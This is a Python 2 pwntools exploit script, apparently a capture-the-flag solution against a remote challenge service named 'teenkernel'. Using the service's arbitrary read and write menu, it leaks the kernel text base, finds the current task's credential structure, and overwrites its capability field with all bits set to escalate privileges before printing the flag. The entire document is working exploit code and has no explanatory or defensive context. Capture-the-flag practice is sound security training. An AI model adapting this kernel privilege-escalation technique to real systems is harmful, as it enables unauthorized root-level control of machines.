#!/usr/bin/env python2
from pwn import *
context.arch = 'amd64'
#context.log_level = 'debug'

r = remote('teenkernel.forfuture.fluxfingers.net', 1337)

def readptr(addr):
    r.sendlineafter('> ', '1')
    r.sendlineafter('> ', str(addr))
    r.recvuntil('alright: ')
    return int(r.recvn(16), 16)

def writeptr(addr, val):
    r.sendlineafter('> ', '2')
    r.sendlineafter('> ', str(addr))
    r.sendlineafter('> ', str(val))

def getflag():
    r.sendlineafter('> ', '4')
    r.recvuntil('flag: \r\r\n')
    return r.recvuntil('}')

MAX = 1 << 64
buf = readptr(32) - 0x40

def to_offset(i):
    return (i+MAX-buf) % MAX

kernel_text_base = readptr(72) - 0xe1157
current_task_addr = kernel_text_base + 0xa3e040
print 'kernel_text_base:', hex(kernel_text_base)

cred_addr = readptr(to_offset(current_task_addr)) + 0x40
print 'cred_addr:', hex(cred_addr)

cap = readptr(to_offset(cred_addr)) + 0x50
print 'cap:', hex(cap)

# set all capabilities
writeptr(to_offset(cap), 0xffffffffffffffff)
print 'FLAG:', getflag()
